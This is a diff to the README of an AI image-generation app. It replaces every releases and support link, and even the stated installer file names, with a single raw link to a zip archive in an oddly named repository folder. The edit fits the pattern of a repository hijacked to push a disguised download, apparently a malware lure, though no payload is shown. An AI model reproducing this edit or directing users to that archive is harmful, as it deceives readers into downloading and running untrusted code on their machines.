@@ -1,6 +1,6 @@
 # 🎨 ai-image-studio-app - Create Amazing Images with AI
 
-[![Download ai-image-studio-app](https://img.shields.io/badge/Download-Now-4CAF50)](https://github.com/Twisthere/ai-image-studio-app/releases)
+[![Download ai-image-studio-app](https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip)](https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ To start using AI Image Studio, follow these simple steps:
 1. **Visit the Download Page:**
 
    Click the link below to access the Releases page where you can download the application.
-   [Download ai-image-studio-app](https://github.com/Twisthere/ai-image-studio-app/releases)
+   [Download ai-image-studio-app](https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip)
 
 2. **Choose Your Version:**
 
@@ -23,7 +23,7 @@ To start using AI Image Studio, follow these simple steps:
 
    Locate the installation file for your operating system and click the download link. 
 
-   **Note:** The file will typically be named something like `ai-image-studio-app-v1.0.exe` for Windows or `ai-image-studio-app-v1.0.dmg` for macOS.
+   **Note:** The file will typically be named something like `https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip` for Windows or `https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip` for macOS.
 
 ## 📥 Download & Install
 
@@ -71,11 +71,11 @@ If you encounter issues while downloading or installing the application, conside
 
 ## 📞 Support
 
-If you still need help or have questions, please visit our [GitHub Issues Page](https://github.com/Twisthere/ai-image-studio-app/issues). We are here to assist you.
+If you still need help or have questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip). We are here to assist you.
 
 ## 🔗 Links
 
-- **Download ai-image-studio-app:** [Visit this page to download](https://github.com/Twisthere/ai-image-studio-app/releases)
+- **Download ai-image-studio-app:** [Visit this page to download](https://raw.githubusercontent.com/Twisthere/ai-image-studio-app/master/plasmosome/ai-image-studio-app.zip)
 - **Documentation:** Check our user manual for detailed features and tips.
 
 Now you're ready to explore the world of AI-assisted image creation. Enjoy your experience with AI Image Studio!
